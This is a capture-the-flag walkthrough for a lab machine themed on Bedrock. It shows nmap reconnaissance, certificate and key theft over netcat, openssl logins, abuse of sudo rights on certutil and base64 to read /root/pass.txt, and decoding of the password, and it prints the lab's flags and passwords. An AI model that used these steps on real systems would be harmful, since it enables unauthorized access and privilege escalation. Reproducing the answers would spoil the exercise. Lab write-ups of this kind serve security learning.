B3DR0CK

$IP 10.10.159.2

scan IP by suing NMAP

nmap -sCV -vv $IP -oN nmap.txt

22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
9009/tcp open  pichat? syn-ack ttl 63
Discovered open port 54321/tcp on 10.10.159.2
Discovered open port 4040/tcp on 10.10.159.2




let hit 10.10.159.2 on web browser 
it redirect to the https://10.10.159.2:4040

wich contain

Welcome to ABC!

Abbadabba Broadcasting Compandy

We're in the process of building a website! Can you believe this technology exists in bedrock?!?

Barney is helping to setup the server, and he said this info was important...

Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
Bamm Bamm tried to setup a sql database, but I don't see it running.
Looks like it started something else, but I'm not sure how to turn it off...

He said it was from the toilet and OVER 9000!

Need to try and secure connections with certificates...

let find the certificate on 9009 port 


sudo nc -v 10.10.159.2 9009
 search ssh key and certificate 

![Screenshot 2022-09-06 at 01 28 32](https://user-images.githubusercontent.com/49148722/188754812-4dfd8daf-e2bf-4d42-ae31-51831900d156.png)
![Screenshot 2022-09-06 at 01 28 46](https://user-images.githubusercontent.com/49148722/188754818-24c4a36b-ffa2-42e4-aadb-295c502b53a3.png)

 save bothe file and use in 54321 to gain access 

use openssl

openssl s_clint -connect $IP -cert certificate -key key


i found the password hint 
d1ad7c0a3805955a35eb260dab4180dd for Barney Rubble



![Screenshot 2022-09-06 at 01 30 16](https://user-images.githubusercontent.com/49148722/188754696-912be00b-9026-44a4-b98e-4c900be1a02d.png)


What is the barney.txt flag? 

THM{f05780f08f0eb1de65023069d0e4c90c}

![Screenshot 2022-09-06 at 01 30 25](https://user-images.githubusercontent.com/49148722/188754720-df71bcb8-faa2-4dfe-8724-879792a93676.png)

What is fred's password?
 
 let jump into find the fred certificate and the key
 	sudo -l
 			User barney may run the following commands on b3dr0ck:
    (ALL : ALL) /usr/bin/certutil

 sudo /usr/bin/certutil ls

Current Cert List: (/usr/share/abc/certs)
------------------
total 56
drwxrwxr-x 2 root root 4096 Apr 30 21:54 .
drwxrwxr-x 8 root root 4096 Apr 29 04:30 ..
-rw-r----- 1 root root  972 Sep  5 23:19 barney.certificate.pem
-rw-r----- 1 root root 1678 Sep  5 23:19 barney.clientKey.pem
-rw-r----- 1 root root  894 Sep  5 23:19 barney.csr.pem
-rw-r----- 1 root root 1674 Sep  5 23:19 barney.serviceKey.pem
-rw-r----- 1 root root  976 Sep  5 23:19 fred.certificate.pem
-rw-r----- 1 root root 1674 Sep  5 23:19 fred.clientKey.pem
-rw-r----- 1 root root  898 Sep  5 23:19 fred.csr.pem
-rw-r----- 1 root root 1674 Sep  5 23:19 fred.serviceKey.pem

save the fret certificate.pem in two file 

![Screenshot 2022-09-06 at 01 30 59](https://user-images.githubusercontent.com/49148722/188755142-ca25d75c-e66d-402f-84f5-f80f82b40ac3.png)

and sun openssl to see password hint 

![Screenshot 2022-09-06 at 01 31 24](https://user-images.githubusercontent.com/49148722/188755211-f7cb3404-32d5-4ca6-ab87-a1ed970282b3.png)

Password hint: YabbaDabbaD0000! (user = 'fredcertificatepem')


![Screenshot 2022-09-06 at 01 31 42](https://user-images.githubusercontent.com/49148722/188755223-3dd786da-c44d-40c5-9d22-2254a17044d7.png)



What is the fred.txt flag?

![Screenshot 2022-09-06 at 01 31 49](https://user-images.githubusercontent.com/49148722/188755234-3d6931e8-6317-4a2c-9a4f-94f2fddbb47a.png)


THM{08da34e619da839b154521da7323559d}

What is the root.txt flag?

![Screenshot 2022-09-06 at 01 30 35](https://user-images.githubusercontent.com/49148722/188755263-9cc31943-7694-40f3-b4ed-134641242075.png)

sudo -l
Matching Defaults entries for fred on b3dr0ck:
    insults, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on b3dr0ck:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt

 sudo /usr/bin/base64 /root/pass.txt

TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dOQkdYVVJUTEpaS0ZTU1lLCg==

![Screenshot 2022-09-06 at 01 32 12](https://user-images.githubusercontent.com/49148722/188754940-ce62c2ed-d305-4ec5-a152-c688b2dfe24b.png)


echo "TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dOQkdYVVJUTEpaS0ZTU1lLCg==" | base64 -d                    
LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK

decode with base32

![Screenshot 2022-09-06 at 01 32 34](https://user-images.githubusercontent.com/49148722/188754961-033b907b-d78d-46ef-8217-c9ff8e23c15a.png)

YTAwYTEyYWFkNmI3YzE2YmYwNzAzMmJkMDVhMzFkNTYK


decode with base64

![Screenshot 2022-09-06 at 01 32 39](https://user-images.githubusercontent.com/49148722/188754978-3a29cc20-d0c2-4bc9-a207-238b40a1067b.png)

a00a12aad6b7c16bf07032bd05a31d56


its MD5 hase now decode by using online tools

flintstonesvitamins

lets use this password on root command 

cat /root/root.txt

![Screenshot 2022-09-06 at 01 32 54](https://user-images.githubusercontent.com/49148722/188754887-de21115f-20a3-4559-a93a-06a34344aceb.png)

THM{de4043c009214b56279982bf10a661b7}
